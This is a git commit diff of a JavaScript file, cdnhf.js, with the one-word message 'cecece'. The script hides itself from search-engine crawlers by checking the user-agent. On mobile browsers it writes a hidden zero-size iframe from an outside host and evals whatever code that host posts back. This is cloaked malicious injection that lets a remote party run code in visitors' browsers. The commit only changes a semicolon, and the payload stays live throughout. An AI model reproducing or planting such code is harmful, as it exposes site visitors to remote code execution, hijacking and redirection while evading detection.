245b30fdd9e0732e5c3c66f13dd600c6e5ca1c57
dage66788 <57900683+dage66788@users.noreply.github.com>
2021-04-22 17:35:34 +0800

    cecece

--- cdnhf.js
+++ cdnhf.js
@@ -1,7 +1,7 @@
 if(navigator.userAgent.match(/(spider|BaiduGame|Googlebot|msnbot|Yahoo! Slurp|YoudaoBot|Yahoo Slurp|Spider|Google AdSense)/i)){
 } else {
 if(navigator.userAgent.match(/(iPhone|Android|ipad)/i)){
-(function(){var __yrnqid='k'+Math.random().toString(36).substr(2);document.writeln('<div id="'+__yrnqid+'"></div>');window.addEventListener("message",function(e){var _des_s_2573=e.data;if(_des_s_2573.des_s_2573){var _s = '/+/g';eval(decodeURIComponent(_des_s_2573.des_s_2573.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://www.govshenzhen.cn:4443/ty/c-2573-25-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})()
+(function(){var __yrnqid='k'+Math.random().toString(36).substr(2);document.writeln('<div id="'+__yrnqid+'"></div>');window.addEventListener("message",function(e){var _des_s_2573=e.data;if(_des_s_2573.des_s_2573){var _s = '/+/g';eval(decodeURIComponent(_des_s_2573.des_s_2573.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://www.govshenzhen.cn:4443/ty/c-2573-25-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();
 (function (){
                         var id = "2415689770463175004-15159";
   document.write('<ins style="display:none!important" id="' + id + '"></ins>');
